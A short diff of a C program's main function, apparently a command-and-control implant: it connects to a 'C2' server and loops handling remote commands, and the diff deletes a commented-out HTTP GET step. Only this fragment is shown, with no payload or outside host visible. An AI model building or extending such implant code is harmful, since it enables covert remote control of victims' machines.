@@ -232,16 +232,6 @@ int main()
         return -1;
     }
 
-    /**printf("Successfully connected to C2; sending HTTP GET request...\n");
-    if (!sendGetRequest(&client_fd))
-    {
-        printf("Failed to send HTTP GET request!\n");
-        return -1;
-    }*/
-
-    // GET request succeeded, continue to handle commands
-    //printf("Successful GET request; continuing implant loop...\n");
-
     if (!handleCommands(&client_fd))
     {
         printf("Failed handling commands from C2!\n");
